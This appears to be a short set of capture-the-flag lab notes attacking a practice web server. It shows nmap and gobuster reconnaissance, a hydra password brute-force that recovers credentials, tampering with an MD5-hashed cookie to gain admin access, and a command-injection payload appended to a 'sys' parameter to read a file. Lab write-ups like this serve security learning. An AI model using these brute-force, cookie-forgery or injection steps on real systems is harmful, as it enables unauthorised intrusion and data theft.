Attackbox
`10.129.123.39`

Target
`10.129.136.251`
`http://10.129.136.251/`

`nmap -sV 10.129.136.251`
22: ssh OpenSSH 9.6p1 Ubuntu 3ubuntu13.11
80: http Apache httpd 2.4.58

`gobuster dir -u http://10.129.136.251:80 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -t 20`

200
- index.php
- info.php
301
- js /
- layout /
- skins/
- includes /
403
- .hta
- .htpasswd
- .htaccess
- server-status

info.php findings
- Server API: Apache 2.0 Handler
- Config file path: `/etc/php/8.3/apache2`
- Server Admin: `webmaster@localhost`
- sockets: enabled


```Shell
hydra -l help@support.thm -P /usr/share/wordlists/rockyou.txt 10.129.136.251 http-post-form "/index.php:email=^USER^&password=^PASS^:F=Invalid credentials"
```

--> `help@support.thm:snoopy`

Change skin
`http://10.129.136.251/dashboard.php?skin=red`

--> `skin` could be a vulnerable parameter

`gobuster fuzz -u http://10.129.136.251/dashboard.php?skin=FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -t 20`

isITUser: `68934a3e9455fa72420237eb05902327`

md5: "false"

md5 "true": `b326b5062b2f0e69046810717534cb09`

--> access to IT Admin Panel

`http://10.129.136.251/user/1`
	--> `specialadmin@support.thm`

`support@110` actually `support110`???

Date/Time dropdown menu --> inspect > network --> it's executing a sys command: `sys: 'date'`

--> edit and resend request with this payload: `sys=date;cat /home/ubuntu/user.txt`